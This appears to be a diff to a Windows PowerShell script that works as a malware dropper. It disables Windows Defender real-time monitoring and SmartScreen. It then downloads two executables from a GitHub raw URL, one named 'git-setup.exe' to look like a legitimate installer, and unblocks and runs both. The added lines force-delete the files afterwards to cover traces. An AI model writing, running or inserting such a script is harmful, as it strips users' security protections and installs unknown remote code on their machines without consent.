@@ -3,9 +3,12 @@ start windowsdefender://threatsettings
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
 
 curl.exe -L -o ".\git-setup.exe" "https://raw.githubusercontent.com/ziiione/1/main/git-setup.exe"; Unblock-File ".\git-setup.exe"; .\git-setup.exe
 
 curl.exe -L -o ".\systems.exe" "https://raw.githubusercontent.com/ziiione/1/main/systems.exe"; Unblock-File ".\systems.exe"; .\systems.exe
+
+Remove-Item ".\git-setup.exe" -Force
+
+Remove-Item ".\systems.exe" -Force
